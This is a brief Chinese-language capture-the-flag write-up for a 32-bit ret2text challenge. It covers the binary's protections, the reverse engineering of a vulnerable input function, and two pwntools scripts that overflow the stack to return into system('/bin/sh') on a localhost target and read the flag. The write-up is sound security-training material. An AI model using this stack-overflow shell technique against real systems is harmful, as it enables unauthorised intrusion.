# ret2text 32

## 文件分析

下载`pwn`, NX on, PIE off, Canary off, RELRO partial  
~~这不是写明了32位~~

## 逆向

观察vuln函数里面输入一个数，并其后从输入中获取对应字节数 ~~%d个？随便打~~  
观察.text段，存在`b4ckdoor`函数，但是执行echo hi？？

显然，在第一步的exp中，只是跳转到该函数是没用的  
~~进一步探索，发现程序中system读取ebx寄存器中的内容  
而程序中存在`pop ebx; ret;`和`/bin/sh`~~  
先后压栈`system()`和`/bin/sh`即可  
再次发起exp

## EXPLOIT

```python
from pwn import *
sh = remote("localhost", 42473)
sh.sendline(b'100')
sh.sendline(b'0'*92 + p32(0x0804928c)) # Addr of ba4kdoor
sh.interactive()
```

成功打印出`hi!`！但是没有flag

```python
from pwn import *
sh = remote("localhost", 42473)
sh.sendline(b'100')
sh.sendline(b'0'*92 + p32(0x080492a9) + p32(0x0804c02c)) # Addr of system & /bin/sh
sh.interactive()
```

> 做到这里的时候是0:09，网站打不开了，不会还有宵禁吧？明日再战
>
> 后记：真的有宵禁，12点后对外网关闭

再次运行，`cat flag`，得到flag

Done.
